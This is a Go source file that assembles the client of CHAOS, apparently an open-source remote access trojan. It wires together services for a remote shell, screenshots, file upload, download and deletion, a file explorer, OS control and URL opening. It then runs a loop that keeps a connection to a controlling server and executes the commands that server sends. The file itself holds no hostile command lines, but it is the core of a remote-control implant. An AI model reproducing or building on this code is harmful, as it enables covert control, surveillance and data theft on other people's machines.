package app

import (
	"context"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
	"github.com/tiagorlampert/CHAOS/client/app/services/download"
	"github.com/tiagorlampert/CHAOS/client/app/services/explorer"
	"github.com/tiagorlampert/CHAOS/client/app/services/information"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"github.com/tiagorlampert/CHAOS/client/app/services/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
	"github.com/tiagorlampert/CHAOS/client/app/services/url"
	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
	"golang.org/x/sync/errgroup"
	"log"
)

type App struct {
	Handler *handler.Handler
}

func New(configuration *environment.Configuration) *App {
	infoService := information.NewService(configuration.Server.HttpPort)

	deviceSpecs, err := infoService.LoadDeviceSpecs()
	if err != nil {
		log.Fatal("error loading device specs: ", err)
	}

	httpClient := network.NewHttpClient(10)

	operatingSystem := os.DetectOS()
	terminalService := terminal.NewService()

	clientGateway := client.NewGateway(configuration, httpClient)

	clientServices := &services.Services{
		Information: infoService,
		Terminal:    terminalService,
		Screenshot:  screenshot.NewService(),
		Download:    download.NewService(configuration, clientGateway),
		Upload:      upload.NewService(configuration, httpClient),
		Delete:      delete.NewService(),
		Explorer:    explorer.NewService(),
		OS:          os.NewService(configuration, terminalService, operatingSystem),
		URL:         url.NewURLService(terminalService, operatingSystem),
	}

	return &App{handler.NewHandler(
		configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
}

func (a *App) Run() {
	g, _ := errgroup.WithContext(context.Background())

	g.Go(func() error {
		a.Handler.KeepConnection()
		return nil
	})

	g.Go(func() error {
		a.Handler.HandleCommand()
		return nil
	})

	g.Wait()
}
